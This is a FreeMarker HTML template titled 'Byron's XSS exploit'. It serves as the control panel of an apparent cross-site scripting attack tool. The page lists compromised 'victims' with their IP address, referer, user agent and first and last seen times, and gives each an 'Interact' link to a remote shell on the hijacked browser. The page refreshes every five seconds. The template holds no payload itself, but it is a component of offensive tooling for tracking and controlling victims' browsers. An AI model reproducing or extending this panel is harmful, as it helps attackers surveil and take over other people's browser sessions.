<#import "spring.ftl" as spring />

<!DOCTYPE html>
<html>
<head>
    <script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
</head>

<body>

<script>
    setTimeout(function(){
        window.location.reload();
    }, 5000);
</script>

<div class="main">
    <h1>Byron's XSS exploit</h1>
    <br>

<#if victims?size != 0>
    <table border="1">
        <thead>

            <tr>
                <td>Id</td>
                <td>Ip</td>
                <td>Referer</td>
                <td>User Agent</td>
                <td>First Seen</td>
                <td>Last Seen</td>
                <td>Shell</td>
            </tr>
        </thead>
        <tbody>
            <#list victims as victim>
                <tr>
                    <td>${victim.id}</td>
                    <td>${victim.ip}</td>
                    <td>${victim.referer}</td>
                    <td>${victim.userAgent}</td>
                    <td>${victim.firstSeen}</td>
                    <td>${victim.lastSeen}</td>
                    <td><a href="/shell/${victim.id}">Interact</a><br></td>
                </tr>
            </#list>
        </tbody>
    </table>
</#if>

<br>
<br>
<br>
<br>
<br>
    <a href="/victim">victim</a>
</div>

</body>
</html>